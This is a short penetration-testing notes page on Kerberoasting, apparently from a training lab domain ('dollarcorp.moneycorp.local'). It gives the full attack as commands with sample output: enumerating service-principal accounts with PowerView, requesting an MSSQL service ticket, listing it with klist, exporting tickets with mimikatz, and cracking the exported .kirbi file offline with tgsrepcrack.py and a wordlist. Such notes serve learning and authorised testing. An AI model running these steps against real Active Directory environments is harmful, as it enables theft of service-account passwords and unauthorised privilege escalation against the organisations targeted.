---
description: >-
  The process of cracking Kerberos service tickets and rewriting them in order
  to gain access to the targeted service.
---

# Kerberoast

## About

The Kerberos session ticket \(TGS\) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.

## Find user account used as service account

We first need to find out services running with user accounts as the services running with machine accounts have difficult passwords.

```text
Get-NetUser -SPN
```

Example output snipet:

```text
...
logoncount            : 22
badpasswordtime       : 5/3/2020 2:03:27 AM
description           : Account to be used for services which need high privileges.
distinguishedname     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : svc admin
lastlogontimestamp    : 8/20/2020 3:34:43 AM
userprincipalname     : svcadmin
name                  : svc admin
objectsid             : S-1-5-21-1874506631-3219952063-538504511-1122
samaccountname        : svcadmin
...
serviceprincipalname  : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433,
                        MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
...
```

## Request SPN Ticket

```text
Request-SPNTicket MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local

Id                   : uuid-9161476c-785c-4810-b211-2ec7ba1de53c-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 9/29/2020 7:08:49 AM
ValidTo              : 9/29/2020 5:06:17 PM
ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

### Verify - list current tickets

```text

PS C:\AD\kerberoast> klist

Current LogonId is 0:0x2032db0

Cached Tickets: (4)

...
#1>     Client: student182 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 9/29/2020 0:08:49 (local)
        End Time:   9/29/2020 10:06:17 (local)
        Renew Time: 10/6/2020 0:06:17 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
...
```

## Export tickets

Export current tickets using mimikatz

```text
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## Crack ticket

{% hint style="info" %}
John or Hashcat can be used for ticket password cracking as well.
{% endhint %}

Use _tgsrepcrack.py_ from _kerberoast_ repository below:

```text
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt C:\AD\kerberoast\1-40a10000-student182@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

{% embed url="https://github.com/nidem/kerberoast" %}

